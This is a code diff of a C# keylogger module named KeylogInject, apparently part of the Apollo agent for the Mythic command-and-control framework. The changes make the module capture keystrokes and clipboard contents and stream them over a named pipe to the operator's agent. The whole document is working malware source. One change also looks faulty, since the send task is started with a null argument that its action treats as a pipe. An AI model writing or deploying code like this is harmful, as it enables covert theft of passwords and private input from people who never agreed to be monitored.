@@ -13,6 +13,8 @@ using static KeylogInject.Native;
 using System.Collections.Concurrent;
 using ApolloInterop.Classes;
 using System.IO.Pipes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Constants;
 
 namespace KeylogInject
 {
@@ -28,8 +30,12 @@ namespace KeylogInject
         private static bool _completed = false;
         private static AutoResetEvent _completeEvent = new AutoResetEvent(false);
         private static JsonSerializer _jsonSerializer = new JsonSerializer();
-        private static Task _flushTask;
-        private static Action<object> _flushAction;
+        
+        private static Task _sendTask = null;
+        private static Action<object> _sendAction = null;
+
+        private static Task _flushTask = null;
+        private static Action _flushAction = null;
 
         private static IntPtr _hookIdentifier = IntPtr.Zero;
 
@@ -44,7 +50,7 @@ namespace KeylogInject
             }
             _namedPipeName = args[0];
 #endif
-            _flushAction = new Action<object>((object p) =>
+            _sendAction = new Action<object>((object p) =>
             {
                 PipeStream ps = (PipeStream)p;
                 WaitHandle[] waiters = new WaitHandle[]
@@ -63,20 +69,17 @@ namespace KeylogInject
                 ps.Flush();
                 ps.Close();
             });
-            _flushTask = new Task(_flushAction, null);
             _server = new AsyncNamedPipeServer(_namedPipeName, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
             _server.ConnectionEstablished += OnAsyncConnect;
-            _server.MessageReceived += OnAsyncMessageReceived;
             _server.Disconnect += ServerDisconnect;
-            
-            
-            _cts.Cancel();
+
+            _completeEvent.WaitOne();
         }
 
         private static void StartKeylog()
         {
-            ClipboardNotification.LogMessage = _keylogs.Add;
-            Keylogger.LogMessage = _keylogs.Add;
+            ClipboardNotification.LogMessage = AddToSenderQueue;
+            Keylogger.LogMessage = AddToSenderQueue;
             Thread t = new Thread(() => Application.Run(new ClipboardNotification()));
             t.SetApartmentState(ApartmentState.STA);
             t.Start();
@@ -94,7 +97,8 @@ namespace KeylogInject
 
         private static void ServerDisconnect(object sender, NamedPipeMessageArgs e)
         {
-            _cts.Cancel();
+            _completed = true;
+            _completeEvent.Set();
         }
 
         private static bool AddToSenderQueue(IMythicMessage msg)
@@ -119,47 +123,18 @@ namespace KeylogInject
             }
         }
 
-        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
-        {
-            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
-                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
-            lock (MessageStore)
-            {
-                if (!MessageStore.ContainsKey(chunkedData.ID))
-                {
-                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
-                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
-                }
-            }
-            MessageStore[chunkedData.ID].AddMessage(chunkedData);
-        }
-
-        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
-        {
-            MessageType mt = args.Chunks[0].Message;
-            List<byte> data = new List<byte>();
-
-            for (int i = 0; i < args.Chunks.Length; i++)
-            {
-                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
-            }
-
-            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
-            //Console.WriteLine("We got a message: {0}", mt.ToString());
-            _recieverQueue.Enqueue(msg);
-            _receiverEvent.Set();
-        }
-
         public static void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
         {
             // We only accept one connection at a time, sorry.
-            if (_clientConnectedTask != null)
+            if (_sendTask != null)
             {
                 args.Pipe.Close();
                 return;
             }
-            _clientConnectedTask = new ST.Task(_sendAction, args.Pipe);
-            _clientConnectedTask.Start();
+            _sendTask = new Task(_sendAction, null);
+            _sendTask.Start();
+            Thread t = new Thread(StartKeylog);
+            t.Start();
         }
     }
 }
